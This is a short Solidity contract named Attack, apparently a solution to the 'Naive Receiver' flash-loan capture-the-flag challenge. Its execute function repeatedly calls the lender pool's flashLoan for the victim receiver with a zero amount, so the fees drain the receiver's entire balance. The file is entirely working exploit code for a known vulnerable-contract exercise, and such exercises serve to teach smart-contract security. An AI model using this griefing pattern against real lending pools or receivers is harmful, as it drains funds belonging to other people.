// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;

import "./FlashLoanReceiver.sol";
import "./NaiveReceiverLenderPool.sol";

/*
* @title: 
* @author: Anthony (fps) https://github.com/0xfps.
* @dev: 
*/
contract Attack {
    FlashLoanReceiver public flash_loan_receiver;
    NaiveReceiverLenderPool public naive_receiver_lender_pool;

    function initialize(address _flash, address _naive) public {
        flash_loan_receiver = FlashLoanReceiver(payable(_flash));
        naive_receiver_lender_pool = NaiveReceiverLenderPool(payable(_naive));
    }

    function viewFlashLoanBalance() public view returns(uint256) {
        return address(flash_loan_receiver).balance;
    }

    function viewNaiveReceiverLenderPoolBalance() public view returns(uint256) {
        return address(naive_receiver_lender_pool).balance;
    }

    function execute() public {
        uint256 j = address(flash_loan_receiver).balance;
        
        while (j > 0) {
            naive_receiver_lender_pool.flashLoan(address(flash_loan_receiver), 0);
            j = address(flash_loan_receiver).balance;
        }
    }
}
